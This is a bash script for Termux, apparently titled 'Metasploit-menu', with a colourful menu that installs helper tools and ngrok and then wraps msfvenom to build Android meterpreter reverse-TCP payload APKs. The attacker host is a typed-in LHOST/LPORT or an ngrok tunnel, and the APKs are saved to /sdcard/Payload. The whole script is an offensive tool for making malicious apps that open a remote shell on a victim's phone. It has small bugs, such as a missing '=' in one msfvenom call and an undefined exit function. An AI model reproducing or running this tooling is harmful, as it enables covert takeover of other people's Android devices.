bin() {
	cd $PREFIX/bin
	}
	fix() {
		apt --fix-broken install
		}
		rcheck () {
			bin
		if [ -e random ];then
		printf "\n\033[1;92m [√] Installed random. \n"
		else
		printf "\n\033[1;92m [+] Installing random..\n"
		cd ~
		fix
		cd ~/Metasploit-menu
		dpkg -i random.deb
		fi
		}
		fontcheck() {
			if [ -e $PREFIX/share/figlet/font.flf ];then
			echo
			else
			cd ~/Metasploit-menu
			dpkg -i font.deb
			fi
			}
		ngcheck () {
			bin
		if [ -e ngrok ];then
		printf "\n\033[1;92m [√] Installed ngrok \n\n"
		else
		printf "\n\033[1;92m [+] Installing ngrok..\n"
		cd ~
		fix
		wget https://github.com/rooted-cyber/Ngrok-All-Version/raw/main/ngrok-2.2.9-linux-arm64.zip
		unzip ngrok*
		cp ngrok $PREFIX/bin
		chmod 700 $PREFIX/bin/ngrok
		fi
		
		}
	pcheck () {
		rcheck
		bin
		if [ -e toilet ];then
		printf "\n\033[1;92m [√] Installed toilet. \n"
		else
		printf "\n\033[1;92m [+] Installing toilet..\n"
		cd ~
		fix
		apt download toilet
		dpkg -i toilet*
		fi
		bin
		if [ -e figlet ];then
		printf "\n\033[1;92m [√] Installed figlet. \n"
		else
		printf "\n\033[1;92m [+] Installing figlet..\n"
		cd ~
		fix
		apt download figlet
		dpkg -i figlet*
		fi
		bin
		if [ -e wget ];then
		printf "\n\033[1;92m [√] Installed wget. \n"
		else
		printf "\n\033[1;92m [+] Installing wget..\n"
		cd ~
		fix
		apt download wget
		dpkg -i wget*
		fi
		clear
		}
	banner() {
		pcheck
		fontcheck
	toilet -f font.flf -F metal -f term Metasploit
	toilet -f font.flf -F metal Menu
	printf "\n\n\033[1;93mCreated by :\033[0m https://github.com/rooted-cyber/\n\n"
	}
	folder() {
		cd ~/Metasploit-menu
		}
	check() {
		if [ -e $PREFIX/bin/msfvenom ];then
		echo
		else
		printf "\n\n\033[1;91m [×]\033[1;93m First install Metasploit !!!\n\n"
		exit
		fi
		}
		fcheck() {
			if [ -e /sdcard/Payload ];then
			echo
			else
			cd /sdcard
			termux-setup-storage
			mkdir Payload
			fi
			}
		
		
		
		
		start() {
			check
			msfconsole
			}
			normal () {
				echo
				random
				echo -e -n "Enter LHOST : \033[0m"
				read bb
				if [ $bb ];then
				echo
				sleep 1
				random
				echo -e -n "Enter LPORT : \033[0m"
				fi
				read cc
				if [ $cc ];then
				echo
				random
				printf "Plase wait ..\n"
				msfvenom -p android/meterpreter/reverse_tcp LHOST=$bb LPORT=$cc R > /sdcard/Payload/Payload.apk
				random
				printf "\n\n Successfully saved Payload \033[1;91m(\033[0m/sdcard/Payload\033[1;91m)\n\n"
				toilet -f font -F metal Exiting
				fi
				}
				ng() {
					pcheck
					ngcheck
					printf "\033[1;93m[+]\033[1;92m Starting Ngrok Server...\n"
					killall -2 ngrok > /dev/null 2>&1
					ngrok tcp 4444 > /dev/null 2>&1 &
					sleep 12
					link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "tcp://[0-9]*\.tcp\.ngrok\.io:[0-9]*")
					if [ -z $link ];then
					printf "\n\033[1;91m[×]\033[1;93m Try again !!!\n\n"
					echo
					toilet -f font -F metal Exiting
					exit
					fi
					printf "\033[1;93m[+]\033[1;92m Your LHOST and LPORT : \033[1;93m$link\n\n"
					echo -e "\033[1;92m"
					echo -en " Enter above LHOST\033[0m "
					read ab
					if [ $ab ];then
					echo
					echo -en "\033[1;92m Enter above LPORT\033[0m "
					read bc
					fi
					if [ $bc ];then
					
					echo
					sleep 2
					printf "\033[1;92m Please wait .. Creating Your payload\n\n"
					msfvenom -p android/meterpreter/reverse_tcp LHOST=$ab LPORT $bc R > /sdcard/Payload/Ngrok-Payload.apk
					fi
					random
					printf "\n\n Successfully saved Payload \033[1;91m(\033[0m/sdcard/Payload\033[1;91m)\n\n"
					toilet -f font -F metal Exiting
					}
					py() {
						folder
						bash python.sh
						}
						ph() {
							folder
							bash php.sh
							}
			payload() {
				clear
				check
				fcheck
				toilet -f font -F metal Payload
				toilet -f font -F metal Menu
				printf "\n\033[1;92m[\033[0m1\033[1;92m]\033[1;93m Normal payload\n"
				printf "\033[1;92m[\033[0m2\033[1;92m]\033[1;93m python payload\n"
				printf "\033[1;92m[\033[0m3\033[1;92m]\033[1;93m php payload\n"
				printf "\033[1;92m[\033[0m4\033[1;92m]\033[1;93m Ngrok payload\n\n\n"
				
				echo -e -n "\033[1;93mPayload\033[1;96m ➤\033[0m "
				read f
				case $f in
				1)normal ;;
				2)py ;;
				3)ph ;;
				4)ng ;;
				*)payload ;;
				esac
				}
				
	menu () {
		banner
		printf "\033[1;92m[\033[0m1\033[1;92m]\033[1;96m Create payload\n"
		printf "\033[1;92m[\033[0m2\033[1;92m]\033[1;96m Start Metasploit\n"
		printf "\033[1;92m[\033[0m3\033[1;92m]\033[1;96m Exit\n\n\n"
		echo -e -n "\033[1;93mMetasploit\033[1;96m ➤\033[0m "
		read b
		case $b in
		1)payload ;;
		2)start ;;
		3)ep ;;
		*)menu ;;
		esac
		}
		menu
		